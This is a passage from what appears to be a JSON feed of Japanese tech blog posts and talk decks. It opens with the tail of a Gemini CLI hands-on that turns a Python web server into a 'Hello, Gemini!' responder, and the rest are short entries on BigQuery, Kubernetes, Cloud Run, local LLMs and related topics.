プロンプトを工夫して機能追加最後に、対話を通じてアプリケーションに新しい機能を追加してみましょう。ハンズオン1で作成したPythonのWebサーバーコードを拡張します。手順作業ディレクトリへ移動cd gemini-cli-handson現在のコードを確認cat main.pyで現在のコードを再確認します。これはシンプルなWebサーバー機能しかありません。Geminiに機能追加を依頼！このWebサーバーに、「アクセスすると\'Hello, Gemini!\'と表示する」機能を追加してもらいましょう。コード全体を書き換えてもらうように依頼するのがポイントです。\uD83D\uDCBB 実行するコマンド:gemini -p \\"現在のmain.pyを修正して、どのパスにアクセスしても \'Hello, Gemini!\' というテキストを返すように変更してください。コード全体を提示してください。\\" -c main.py生成されたコードでファイルを上書きGeminiが修正版のmain.pyコードを生成します。上書きの指示をしてください。（生成されるコードの例）import http.serverimport socketserverPORT = 8000class MyHandler(http.server.BaseHTTPRequestHandler):    def do_GET(self):        self.send_response(200)        self.send_header(\'Content-type\', \'text/plain; charset=utf-8\')        self.end_headers()        self.wfile.write(\'Hello, Gemini!\'.encode(\'utf-8\'))with socketserver.TCPServer((\\"\\", PORT), MyHandler) as httpd:    print(\\"serving at port\\", PORT)    httpd.serve_forever()動作確認変更したWebサーバーを起動し、ブラウザやcurlコマンドで動作を確認します。\uD83D\uDCBB 実行するコマンド (ターミナル):python3 main.pyもしくは、Gemini-CLIで「main.pyを起動してください」と指示します。\uD83D\uDCBB 別のターミナルを開いて実行、またはブラウザで http://localhost:8000 にアクセス:curl http://localhost:8000ターミナルに \\"Hello, Gemini!\\" と表示されれば、機能追加は成功です！","isoDate":"2025-09-05T09:52:02.000Z","dateMiliSeconds":1757065922000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"2025年夏 コーディングエージェントを統べる者","link":"https://speakerdeck.com/nwiizo/2025nian-xia-kodeinguezientowotong-beruzhe","contentSnippet":"2025年9月5日（金）、台風接近という悪天候の中でしたが、「CNCJ: コーディングエージェント \xd7 セキュリティ ミートアップ」に登壇させていただきました。\\r\\r天候の影響で現地参加が難しい方も多い中、オンラインでの参加や配信により、多くの方にお聞きいただくことができました。\\r\\r### \uD83D\uDCCD イベント情報\\r- 開催日: 2025年9月5日（金）\\r- イベント詳細: CNCFコミュニティページ\\r\\r### \uD83D\uDCF9 録画・資料公開予定\\r- 録画: CNCJのYouTubeチャンネルにて後日公開予定\\r- 発表資料: Connpassページに掲載予定\\r\\r### \uD83D\uDCDD 関連ブログ\\r今回の発表内容のベースとなった考え方については、こちらのブログ記事でも詳しく解説しています：\\r- 「2025年夏 AIエージェントシステムに対する考え方」\\r\\r台風の中、ご参加・ご視聴いただいた皆様、ありがとうございました。","isoDate":"2025-09-05T04:00:00.000Z","dateMiliSeconds":1757044800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"雰囲気で理解していたAPIとは","link":"https://zenn.dev/nedoko_dok0dko/articles/b8c8863bf74be7","contentSnippet":"whatAPIについて調べたことをまとめる自分は雰囲気でAPIを触っている API(Application Programming Interfice)とは「あるソフトウェアの機能やデータを、別のソフトウェアから利用するための窓口や仕組み」のこと。身近な例で言えば、電力会社とコンセントに例えられる。実世界の例として、あなたの家、アパートや他の住処にある電気のコンセントについて考えて下さい。あなたの家で機器を使いたい時には、電源コードのプラグをコンセントに差し込めば事足ります。電源に直接結線したりしないでしょう — そんなのは非効率ですし、あなたが電気工事士でなけれ...","isoDate":"2025-09-04T10:53:53.000Z","dateMiliSeconds":1756983233000,"authorName":"seno","authorId":"seno"},{"title":"HonoとAstroは仲良し〜Cloudflare Workersでの使い方紹介","link":"https://speakerdeck.com/aminevg/honotoastrohazhong-liang-si-cloudflare-workersdenoshi-ifang-shao-jie","contentSnippet":"バックエンド向けウェブフレームワーク「Hono」、フロントエンド向けのウェブフレームワーク「Astro」。実は仲良いですよ！\\r今回はCloudflare Workers上での、HonoとAstroの使い方を紹介します。単独で使う、Hono-in-Astro、Astro-in-Honoなど組み合わせ方が多いです！最後にAstro-in-Hono関連のライブラリも紹介します。","isoDate":"2025-09-03T04:00:00.000Z","dateMiliSeconds":1756872000000,"authorName":"Amine Ilidrissi","authorId":"amine"},{"title":"BigQueryのINFORMATION_SCHEMA.JOBS ビューに現れた「query_dialect」とは?","link":"https://sreake.com/blog/bigquery-information-schema-jobs-query-dialect/","contentSnippet":"はじめに こんにちは。 夏が始まったと思ったらもう暦上では9月。夏の終わりです。時間の流れは早いですね。 こんな感じでいつの間にか秋が来て冬が来て年末になっていたり…不思議です。 今回ですが、BigQueryに「いつの間 […]The post BigQueryのINFORMATION_SCHEMA.JOBS ビューに現れた「query_dialect」とは? first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-03T03:10:23.000Z","dateMiliSeconds":1756869023000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Amazon VPC CNIに学ぶCNI-LT版","link":"https://speakerdeck.com/bells17/amazon-vpc-cninixue-hucni-ltban","contentSnippet":"https://k8sjp.connpass.com/event/365262/","isoDate":"2025-09-02T04:00:00.000Z","dateMiliSeconds":1756785600000,"authorName":"bells17","authorId":"bells17"},{"title":"BigQueryのMERGEステートメントについて","link":"https://zenn.dev/nedoko_dok0dko/articles/52a6a8e2412dcb","contentSnippet":"whatBigQueryのマージステートメントについて調べたことや知ったことを個人的にまとめたもの MERGEステートメントとはhttps://cloud.google.com/bigquery/docs/reference/standard-sql/dml-syntax#merge_statementhttps://cloud.google.com/blog/ja/products/data-analytics/bigquery-explained-data-manipulation-dml別のテーブルと一致する値に基づいて以下のステートメントをまとめて実行できる機...","isoDate":"2025-08-26T10:29:31.000Z","dateMiliSeconds":1756204171000,"authorName":"seno","authorId":"seno"},{"title":"ミニマムかつ未来を見据えたGoogle Cloudアーキテクチャ","link":"https://zenn.dev/kamos/articles/poc_google_cloud","contentSnippet":"!この記事は人間が書き、AIにレビューしてもらいました はじめにAIによって開発が加速した現在、プロダクト開発においてアイデアを素早くプロダクトに落とし込み、実際に市場に展開することが重要になっています。しかしMVP(最小限の実用的製品)を立ち上げる際のクラウドインフラやアーキテクチャの選択は、その後のプロダクトの成長や運用に大きな影響を与えます。本格的な構成を最初期から採用することは立派ですが、MVPが成功するかわからないものに高コストなインフラを選択することはリスクが高いです。逆に、安易に無料枠や低コストなサービスを選択すると、将来的なスケーリングや機能追加が困難になりま...","isoDate":"2025-08-26T02:59:44.000Z","dateMiliSeconds":1756177184000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"DockerからECSへ 〜 AWSの海に出る前に知っておきたいこと 〜","link":"https://speakerdeck.com/ota1022/dockerkaraecshe-awsnohai-nichu-ruqian-nizhi-tuteokitaikoto","contentSnippet":"JAWS-UGコンテナ支部 入門編 #8 初心者大歓迎LT大会のLT登壇資料です。\\rhttps://jawsug-container.connpass.com/event/361918/","isoDate":"2025-08-21T04:00:00.000Z","dateMiliSeconds":1755748800000,"authorName":"Itaru Ota","authorId":"iota"},{"title":"Gemma3 270M がでたらしいのでスペックを見てみる","link":"https://zenn.dev/satohjohn/articles/0866bbd4b2cefa","contentSnippet":"概要説明を見ている限り LLM にしてはめちゃくちゃ軽いなという印象があります（桁が違う）がそれがどういうことなのかを見てみます。 3行まとめローカル(M3 MacBook Pro のメモリ 16GB)で動かす分に関しては全く問題なく動かせる。普通のアプリケーション動かすのと大差なく周りに影響もないシンプルなユースケースに限られる。（後に検証Cloud Run GPU NVIDIA L4 1台で十分スピード感出せる (簡単な文章 200ms程度で返却できるイメージ) docker で動かすモデルが https://hub.docker.com/r/ai/gemm...","isoDate":"2025-08-17T15:17:18.000Z","dateMiliSeconds":1755443838000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Google Cloud RunのDocker Compose対応","link":"https://speakerdeck.com/aminevg/google-cloud-runnodocker-composedui-ying","contentSnippet":"Google Cloud RunがDocker Composeに対応しました！。これで、既存のDockerfileを活用してCloud Runにデプロイできるようになりました。複数のコンテナをまとめて単一サービスとしてデプロイのも便利です。一方で、モノレポへの不向きだったり、複数のサービスをデプロイできなかったり、デメリットもあります。今後はTerraform対応やCompose機能の拡充を期待しています。","isoDate":"2025-08-17T04:00:00.000Z","dateMiliSeconds":1755403200000,"authorName":"Amine Ilidrissi","authorId":"amine"},{"title":"Kubernetes Admission Controlについての技術調査","link":"https://sreake.com/blog/dive-deep-into-kubernetes-admission-control/","contentSnippet":"はじめに 工学院大学工学部電気電子工学科4年の清水悠利と申します。 大学では、C言語とOpenCVを用いた画像解析アルゴリズムの研究に従事しており、それとは別に趣味でWebアプリの開発も行っています。今回Sreake事業 […]The post Kubernetes Admission Controlについての技術調査 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-08-12T13:32:41.000Z","dateMiliSeconds":1755005561000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Agent Development Kitで作るマルチエージェントアプリケーション（AIAgent勉強会）","link":"https://speakerdeck.com/yunosukey/agent-development-kitdezuo-rumarutiezientoapurikesiyon-aiagentmian-qiang-hui","contentSnippet":"","isoDate":"2025-08-08T04:00:00.000Z","dateMiliSeconds":1754625600000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Google Cloudサービスの生成AI関連サービス","link":"https://speakerdeck.com/shukob/google-cloudsabisunosheng-cheng-aiguan-lian-sabisu","contentSnippet":"2025年8月7日(木)、日本生成AIユーザ会 で「Google Cloudサービスの生成AI関連サービス」について発表しました。\\rhttps://genai-users.connpass.com/event/361798/","isoDate":"2025-08-07T04:00:00.000Z","dateMiliSeconds":1754539200000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Agent Development Kitで作るマルチエージェントアプリケーション（GCNT2025）","link":"https://speakerdeck.com/yunosukey/agent-development-kitdezuo-rumarutiezientoapurikesiyon-gcnt2025","contentSnippet":"","isoDate":"2025-08-05T04:00:00.000Z","dateMiliSeconds":1754366400000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"BigQueryのパーティション分割テーブルでTIMESTAMPでエラーが出るときの理由","link":"https://zenn.dev/nedoko_dok0dko/articles/b6d8df76854c0a","contentSnippet":"whatBigQueryでパーティション分割テーブルを作成する際、パーティショニングを設定することができるが、TIMESTAMPを利用しようとするとエラーが出る場合がある「公式ドキュメントでは設定できると記載があるが、エラーが出るのはなぜなのか?」 これについて調べてみたログ BigQueryのパーティショニングについてhttps://cloud.google.com/bigquery/docs/partitioned-tables?hl=jaBQでパーティションテーブルを作る際に、パーティショニングを設定する。これは、公式ドキュメントでは次の型から設定することがで...","isoDate":"2025-07-31T11:40:53.000Z","dateMiliSeconds":1753962053000,"authorName":"seno","authorId":"seno"},{"title":"[KubeCon Japan 2025] Composable Disaggregated Infrastructure(CDI)とは? Kubernetes基盤レイヤーでのHWリソース動的管理","link":"https://sreake.com/blog/kubecon-japan-2025-composable-disaggregated-infrastructure/","contentSnippet":"2025年度の新卒エンジニアとして株式会社3-shakeに入社いたしました、荒木と申します。私はまだまだKubernetesの初学者であり、日々の学習を通じてスキルを向上させていきたいと考えています。 そんな折、先日、K […]The post [KubeCon Japan 2025] Composable Disaggregated Infrastructure(CDI)とは? Kubernetes基盤レイヤーでのHWリソース動的管理 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-07-30T05:12:48.000Z","dateMiliSeconds":1753852368000,"authorName":"Sreake","authorId":"Sreake"},{"title":"[KubeCon 2025 EU/JP] Kubernetes と 宇宙","link":"https://sreake.com/blog/kubecon-2025-eu-jp-kubernetes-and-universe/","contentSnippet":"はじめに 宇宙は、人類にとって長年の探求対象であり、近年は特にKubernetesをはじめとするクラウドネイティブ技術によって、そのデータ処理とコンピューティングの方法が変革され、新たなフロンティアが拓かれつつあります。 […]The post [KubeCon 2025 EU/JP] Kubernetes と 宇宙 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-07-30T02:04:28.000Z","dateMiliSeconds":1753841068000,"authorName":"Sreake","authorId":"Sreake"},{"title":"【解説】Linux 6.11以降で発生しているリグレッションについて","link":"https://dev.mix64.com/2025/07/29/linux6-11-regressions/","contentSnippet":"今回は Linux 6.11 以降で発生しているスケジューラーのリグレッションについて解説します。執筆時点でまだ RFC状態のため、最新情報...","isoDate":"2025-07-28T15:53:01.000Z","dateMiliSeconds":1753717981000,"authorName":"ayibote","authorId":"ayibote"},{"title":"ローカルLLM入門！LM Studioをバックグラウンドで実行しObsidianと連携する","link":"https://zenn.dev/r4ynode/articles/local-llm-intro-with-obsidian","contentSnippet":"はじめに生成AI盛り上がってますね。私は置いていかれています。そんな私、奇遇なことに30コアGPUを積んだMacBookを持っているではないですか。本当は最近キラキラなAI（Devin, Claude Codeなど）を使いたいのですが、時代に逆行してローカルLLMに入門してみます。この記事では以下のことをします。LM Studioに入門Obsidianと連携LM Studio CLIを使ってバックグラウンドで実行一応、ObsidianというのはMarkdownのノートアプリです。本記事では詳しく解説しません。 デモ本記事の手順を最後まで実施すると、LM St...","isoDate":"2025-07-27T09:00:01.000Z","dateMiliSeconds":1753606801000,"authorName":"Reito Koike","authorId":"reito"},{"title":"Go言語におけるオブジェクト指向の実装(classベースとの違い)","link":"https://zenn.dev/takehiro1111/articles/go_object_oriented","contentSnippet":"1.読者想定Goの初学者レベル(私含め)Goとclassを用いたオブジェクト指向の実装をする他言語と書き方を比較整理したい方。!思考の整理のために本記事を書いていますので、独特な表現がある場合はあまり気にしないでください。コードベースでの整理をしたいため、オブジェクト志向についての言及はしておりません。Python,TypeScriptとの比較は私自身のスキルセットの影響のため、比較する際の言語選定に深い意味はないです。\xa0 2.classで書く場合classがデータ（property）と振る舞い（method）をカプセル化し、継承によ...","isoDate":"2025-07-27T03:30:06.000Z","dateMiliSeconds":1753587006000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"転職したらAWS MCPサーバーだった件","link":"https://speakerdeck.com/nwiizo/zhuan-zhi-sitaraaws-mcpsabadatutajian","contentSnippet":"「 転職したらMCPサーバーだった件」というタイトルで登壇したことがある。本日は「JAWS-UG SRE支部 #13 つよつよSREの秘伝のタレ」というなんとなく強そうなイベントで登壇しました。\\r\\r\uD83D\uDD0D イベント詳細:\\r- イベント名: JAWS-UG SRE支部 #13 つよつよSREの秘伝のタレ\\r- 公式URL: https://jawsug-sre.connpass.com/event/358781/\\r- ハッシュタグ: https://x.com/search?q=%23jawsug_sre&f=live\\r- 参考資料①: https://speakerdeck.com/nwiizo/zhuan-zhi-sitaramcpsabadatutajian","isoDate":"2025-07-23T04:00:00.000Z","dateMiliSeconds":1753243200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"【開催報告】2025年夏ワークショップ「クラウドネイティブ技術を体験しよう！」を開催しました","link":"https://sreake.com/blog/2025-summer-workshop-report/","contentSnippet":"はじめに 2025年7月3日（木）・4日（金）の2日間、株式会社スリーシェイクの夏ワークショップを開催しました。今回は13名の学生の皆さんにご参加いただき、クラウドネイティブ技術の世界を体験していただきました。 \uD83D\uDCF8 ワー […]The post 【開催報告】2025年夏ワークショップ「クラウドネイティブ技術を体験しよう！」を開催しました first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-07-21T23:00:00.000Z","dateMiliSeconds":1753138800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Agent Development KitとAgent Engineを使ってVertex AI Agent Builderに入門してみる","link":"https://sreake.com/blog/vertex-ai-agent-builder-with-agent-development-kit-and-agent-engine/","contentSnippet":"1. 概要 本記事では、Googleが提供するAgent Development Kit (ADK) とAgent Engineを利用して、AIエージェントの構築方法を紹介しつつ、Vertex AI Agent Buil […]The post Agent Development KitとAgent Engineを使ってVertex AI Agent Builderに入門してみる first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-07-21T22:00:00.000Z","dateMiliSeconds":1753135200000,"authorName":"Sreake","authorId":"Sreake"},{"title":"技術イベントのメモはOpenAI WhisperとGemini CLIに任せる","link":"https://zenn.dev/r4ynode/articles/audio-transcription-using-openai-whisper","contentSnippet":"イベントの内容覚えてますか？イベントに参加しても内容を覚えていることって少なくないですか？イベントに参加しただけで満足して、特に生産的な活動に活かすことなく終わってしまうことがあると思います。また、登壇者の話を必死にメモしようとして、肝心な内容を聞き逃してしまうこともよくあります。イベント参加は、個人的には学習のモチベーションアップに繋がるので良いのですが、せっかくなら学んだ内容をしっかり定着させたいと思いました。そこで、YouTubeや現地の音声を文字起こしして振り返りたいと考えたものの、理想的なツールが見つからなかったので自分で作ってみることにしました。この記事では、Op...","isoDate":"2025-07-21T00:00:01.000Z","dateMiliSeconds":1753056001000,"authorName":"Reito Koike","authorId":"reito"},{"title":"Analytics Development Lifecycle（ADLC）について","link":"https://zenn.dev/nedoko_dok0dko/articles/19d54d6c57cd93","contentSnippet":"whatdbt Labsが提唱する「Analytics Development Lifecycle(ADLC)」について調べてみたことやわかったことの個人ログ!⚠️ 元記事が英語であり、それを翻訳&個人的意訳しているので少々文章が読みにくくなっているかもしれません Analytics Development Lifecycle（ADLC）とは？※ 日本語にすると「開発分析ライフサイクル」となる?https://www.getdbt.com/resources/the-analytics-development-lifecycle組織がデータ分析をより良く...","isoDate":"2025-07-18T10:59:32.000Z","dateMiliSeconds":1752836372000,"authorName":"seno","authorId":"seno"},{"title":"SRE NEXT 2025 資料一覧","link":"https://zenn.dev/r4ynode/articles/srenext2025-documents","contentSnippet":"本記事についてSRE NEXT 2025に参加しました。自分で後で振り返る用に、公開されている発表資料を視認範囲の中で集めました。とりあえずタイトルをすべて羅列しているので、見つけられていないものに関しては空白になっています。新しく資料が公開、発見されたら追記します。 記載順スケジュール時間に沿って記載しています。https://sre-next.dev/2025/schedule/ DAY 1: 7/11 - 資料一覧 Fast by Friday: Making performance analysis fast and easy資料は見つけられませんでした...","isoDate":"2025-07-11T18:00:00.000Z","dateMiliSeconds":1752256800000,"authorName":"Reito Koike","authorId":"reito"},{"title":"AI時代でもソフトウェア設計の重要性は変わらない(視聴レポ)","link":"https://zenn.dev/r4ynode/articles/event-report-ai-era-domain-design","contentSnippet":"はじめに先日、以下のオンラインイベントを視聴しました。本記事では、イベント内容を踏まえた個人的な学びや気づきを簡単にまとめます。単なる内容の羅列ではなく、自分の言葉で振り返ります。https://forkwell.connpass.com/event/356295/!イベントの注意事項に則り記事を執筆していますが、内容に問題がある場合は速やかに修正・削除いたします。 イベント資料登壇者の方々が公開されているイベント資料はこちらです。https://speakerdeck.com/minodriven/ai-good-code-bad-codehttps://spe...","isoDate":"2025-07-11T01:00:06.000Z","dateMiliSeconds":1752195606000,"authorName":"Reito Koike","authorId":"reito"},{"title":"Obsidian上でGeminiを使う理想環境の探求","link":"https://zenn.dev/r4ynode/articles/obsidian-how-to-use-geminicli","contentSnippet":"はじめにObsidianとGemini CLIを組み合わせた知的生産の効率化手法が注目されています。プロジェクト専用のGEMINI.mdを作成してVault直下に配置し、Gemini CLIを起動することで、ノート作成や情報整理のワークフローを大幅に改善できるというものです。しかし、Obsidianでノートを書きながら別途ターミナルを開いてアプリを行き来するやり方は、思考の流れを分断しがちです。現状のObsidianのAI機能は発展途上であり、多くのユーザーがCursorやGemini CLIなどの外部ツールを併用しているのが実情でしょう。理想的なのは、ノート作成や情報整理の...","isoDate":"2025-07-06T09:00:02.000Z","dateMiliSeconds":1751792402000,"authorName":"Reito Koike","authorId":"reito"},{"title":"ローカルエディタからワンクリックでGoogle Cloud Workstationに接続する方法","link":"https://qiita.com/aminevg/items/27f55b1809b6629567f6","contentSnippet":"背景皆さんは、Google Cloud Workstationsという製品はご存知ですか？「フルマネージド開発環境」を提供していて、セキュリティの強化や開発者のオンボーディングの加速を期待できる製品です。クラウド上の開発環境ということもあって、ブラウザ内での開...","isoDate":"2025-07-02T13:43:33.000Z","dateMiliSeconds":1751463813000,"authorName":"Amine Ilidrissi","authorId":"amine"},{"title":"Obsidianを導入すべきかを本気で考える","link":"https://zenn.dev/r4ynode/articles/obsidian-vs-other-note-apps","contentSnippet":"はじめに巷でObsidianというMarkdownエディタが流行っていますね。Obsidianと生成AIを組み合わせた使い方で注目を浴びています。流行りに乗っかってObsidianを導入してみましたが、ノート同士をリンクさせて何が良いのか全く理解できませんでした。調べると、ObsidianとはZettelkastenというノート術を実践できるアプリケーションのようです。ここで、Obsidianについての説明を公式ページから抜粋します。個人的なメモから日記、ナレッジベース、プロジェクト管理まで、Obsidianはアイデアを考案して整理するためのツールを提供します。リンク：...","isoDate":"2025-07-02T02:50:58.000Z","dateMiliSeconds":1751424658000,"authorName":"Reito Koike","authorId":"reito"},{"title":"「あつまれ Lookerの森 #3」 オンサイト行ってきました記録","link":"https://zenn.dev/nedoko_dok0dko/articles/5da95def70336b","contentSnippet":"what6/27に開催された「あつまれ Lookerの森 #3」のオンサイト参加ログです当日の雰囲気や登壇者の方々の発表内容等を簡単にまとめたものになります あつまれ Lookerの森とはJagu\'e\'rのデータ利活用分科会が主催するLookerにフォーカスを当てた勉強会です※ Jagu\'e\'r: Google Cloudのユーザー会。Lookerだけでなく様々なGoogle Cloud製品に関したコミュニティやイベントを企画・開催しています今回は3回目ということでしたが、私は初めての参加でした。コミュニティイベントというのも初参加だったため、「どんな雰囲気なのだ...","isoDate":"2025-06-30T11:21:02.000Z","dateMiliSeconds":1751282462000,"authorName":"seno","authorId":"seno"},{"title":"Gemini Code Assist for GitHubでPrisma ORMのデータモデリングをレビューする","link":"https://sreake.com/blog/gemini-code-assist-prisma-review/","contentSnippet":"一般的にデータベースの変更はアプリケーションの変更に比べると影響が大きく、慎重な対応が求められます。またcreatedAtのデフォルト値など、実行タイミングにより値が変動する設定をし忘れた場合、元の値を復元することは困難 […]The post Gemini Code Assist for GitHubでPrisma ORMのデータモデリングをレビューする first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-30T06:59:22.000Z","dateMiliSeconds":1751266762000,"authorName":"Sreake","authorId":"Sreake"},{"title":"生成AIで小説を書くためにプロンプトの制約や原則について学ぶ / prompt-engineering-for-ai-fiction ","link":"https://speakerdeck.com/nwiizo/prompt-engineering-for-ai-fiction","contentSnippet":"諸君、聞かれよ。本日、私は「女オタ生成AIハッカソン2025夏東京」なる前代未聞の催しにて、生まれて初めて登壇することと相成った。かつての私は純朴なプログラマーであり、「変数名を30分悩んだ挙句、結局tmpにする」という、実に平凡な悩みを抱える程度の技術者であったのだ。\\r\\r歳月は容赦なく流れ、今や私はプロンプトエンジニアリングという名の魔境に足を踏み入れた哀れな求道者となり果てた。昨夜も丑三つ時まで、私は薄暗い書斎でディスプレイの冷たき光に照らされながら、「なぜ生成AIは『簡潔に』と百回唱えても、源氏物語の長文を生成するのか」という哲学的難題と格闘していたのである。\\r\\r30分という持ち時間に対し50枚のスライドを用意するという、まるで賽の河原で石を積む如き徒労に及んでいる。そのうち半分は「プロンプトという名の現代呪術における失敗例集」と題した、私の苦悩の結晶である。ああ、AIとの対話とは、かくも人間の正気を奪うものなのか。\\r\\r---\\r\\rブログも書いた。\\r生成AIで物語を書くためにプロンプトの制約や原則について学ぶ、という話をしてきました #女オタ生成AI部\\rhttps://syu-m-5151.hatenablog.com/entry/2025/06/30/171149","isoDate":"2025-06-29T04:00:00.000Z","dateMiliSeconds":1751169600000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Snowflakeで始めるリージョン間データ共有","link":"https://sreake.com/blog/inter-region-data-sharing-with-snowflake/","contentSnippet":"はじめに 組織内のSnowflakeアカウント同士で安全にリージョン間データ共有をするなら、LIST機能のOrganizational listingsを使うのが非常におすすめです。 この記事ではSnowflakeがサポ […]The post Snowflakeで始めるリージョン間データ共有 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-27T10:08:28.000Z","dateMiliSeconds":1751018908000,"authorName":"Sreake","authorId":"Sreake"},{"title":"論文紹介：『Commercial LLM Agents Are Already Vulnerable to Simple Yet Dangerous Attacks』","link":"https://sreake.com/blog/commercial-llm-agents-are-already-vulnerable-to-simple-yet-dangerous-attacks/","contentSnippet":"今回は、LLMエージェントシステムの脆弱性に関して述べられている論文の紹介をさせていただきます。3-shakeではさまざまな勉強会が開かれており、今回紹介する論文も勉強会で取り上げた題材となっています。エージェントシステ […]The post 論文紹介：『Commercial LLM Agents Are Already Vulnerable to Simple Yet Dangerous Attacks』 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-27T07:55:50.000Z","dateMiliSeconds":1751010950000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Terraformを使ってVPC内のCloud Runサービス間で通信させる","link":"https://qiita.com/aminevg/items/4912c95b795c6739d703","contentSnippet":"背景Cloud Runはサーバーレスでコンテナを動かせる便利なサービスですが、複数のサービスを連携させようとすると、ネットワーク構成で悩むことがあります。例えば、フロントエンドは一般公開し、バックエンドは内部ネットワークからのみアクセス可能にしたい場合VPC内の...","isoDate":"2025-06-27T07:26:55.000Z","dateMiliSeconds":1751009215000,"authorName":"Amine Ilidrissi","authorId":"amine"},{"title":"AI にどんなコードを書かれても大丈夫！DevContainer+mise で築く「壊されても安心でユニバーサル」な開発環境","link":"https://sreake.com/blog/safe-universal-dev-env-with-devcontainer-mise/","contentSnippet":"はじめに：生成 AI 時代の新たな悩み 「ChatGPT、このバグを直して！」 「GitHub Copilot、この機能を実装して！」 そんなふうに生成 AI に頼んでコードを書いてもらったら、気づいたら開発環境がぐちゃ […]The post AI にどんなコードを書かれても大丈夫！DevContainer+mise で築く「壊されても安心でユニバーサル」な開発環境 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-26T13:16:14.000Z","dateMiliSeconds":1750943774000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Gemini cli が出たっぽいので cloud run deploy までやってみるぞ","link":"https://zenn.dev/satohjohn/articles/4d205e445714cf","contentSnippet":"概要Gemini cli ってのが出ました。https://github.com/google-gemini/gemini-cli基本的には Gemini code assist をローカルでも使えるようなイメージを感じています。（間違ってたらすいません)https://blog.google/technology/developers/introducing-gemini-cli-open-source-ai-agent/30分程度とりま調べた限りでまとめます。無料という言葉に人間は弱いのだよ。 表題の通りやってみる。とりま npm -g でインストールしたら ge...","isoDate":"2025-06-25T16:15:27.000Z","dateMiliSeconds":1750868127000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Google CloudのPDEの更新がきたので受けてきましたよという話","link":"https://zenn.dev/nedoko_dok0dko/articles/74f196e3a1a84f","contentSnippet":"whatGoogle Cloud認定資格のProfessional Data Engineerの更新?が迫っていたので受験してきました記録2年ぶりの試験なので、当時との問題の違いとか個人的な所感とか…を簡単に受験結果は合格でした! Professional Data Engineerについてhttps://cloud.google.com/learn/certification/data-engineer?hl=jaGoogle Cloudの認定資格の一つGoogle Cloud製品におけるデータエンジニア領域の専門知識やスキルを問う試験【例】データ分析...","isoDate":"2025-06-24T10:43:47.000Z","dateMiliSeconds":1750761827000,"authorName":"seno","authorId":"seno"},{"title":"openhands cli で Gemini 2.5-flash を使って Cloud Run でアプリケーションをデプロイする","link":"https://zenn.dev/satohjohn/articles/720102a717eb1a","contentSnippet":"概要タイトルの通りのことをやってみるという企画です。claude code ってみんないうからうーんどうしよう、会社で使ってもらいたいけど Gemini 使いたいなーっていうのを見てたら openhands っていうのがあって、それの cli が良さそうということで、触ろうというモチベーション アプリケーションを作ってもらうとりま動かすだけをやってみますhttps://docs.all-hands.dev/usage/how-to/cli-modeflash でやっているのはめっちゃお金かかったらどうしようという気持ちからです。export CLOUDSDK_ACTI...","isoDate":"2025-06-20T16:06:04.000Z","dateMiliSeconds":1750435564000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"MultiKueueを利用した外部クラスタへのジョブスケジューリング","link":"https://sreake.com/blog/multikueue-job-scheduling-to-external-cluster/","contentSnippet":"この記事の情報は2025年5月時点(v0.11.4)での情報をもとに作成しています。 Kueueのベータに昇格した機能の一つであり、外部クラスタへのスケジューリング機能として注目されるMultiKueueについて解説しま […]The post MultiKueueを利用した外部クラスタへのジョブスケジューリング first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-19T04:15:27.000Z","dateMiliSeconds":1750306527000,"authorName":"Sreake","authorId":"Sreake"},{"title":"2025-06-20 PrivateLinkがNLBなしで作れるようになり便利になった","link":"https://speakerdeck.com/masasuzu/2025-06-20-privatelinkkanlbnasitezuo-reruyouninaribian-li-ninatuta","contentSnippet":"","isoDate":"2025-06-19T04:00:00.000Z","dateMiliSeconds":1750305600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Claude Code どこまでも/ Claude Code Everywhere","link":"https://speakerdeck.com/nwiizo/claude-everywhere","contentSnippet":"僕がClaude Codeに初めて触れたのは、2025年の春だった。生成AIにはすでに慣れ親しんでいた。流行に乗り遅れてはいけないと必死に勉強し、エディターの補完機能やコード生成ツールとして日常的に活用していた。ただ、当時の僕にとってそれはまだ「CLIで動く便利なコーディング支援ツール」程度の認識でしかなかった。「AIが90%のコードを自動生成」という謳い文句を見ても、半信半疑でターミナルを開いたのを覚えている。\\r\\rイベント名:【オフライン開催】KAGのLT会 #6 〜御社のエンジニア育成どうしてる!? スペシャル〜\\r公式URL: https://kddi-agile.connpass.com/event/357862/\\r\\r「実装」から「設計」へのパラダイムシフト というより無限に体力が必要という話をした \\rhttps://syu-m-5151.hatenablog.com/entry/2025/06/19/102529\\r\\r【参考文献】\\r  - 公式ドキュメント\\r    - Claude Code 公式サイト https://www.anthropic.com/claude-code\\r    - Claude Code ドキュメント https://docs.anthropic.com/en/docs/claude-code/overview\\r    - Claude Code Best Practices https://www.anthropic.com/engineering/claude-code-best-practices\\r    - 抽象化をするということ - 具体と抽象の往復を身につける https://speakerdeck.com/soudai/abstraction-and-concretization\\r    - How I Use Claude Code https://spiess.dev/blog/how-i-use-claude-code\\r    - LLMの制約を味方にする開発術 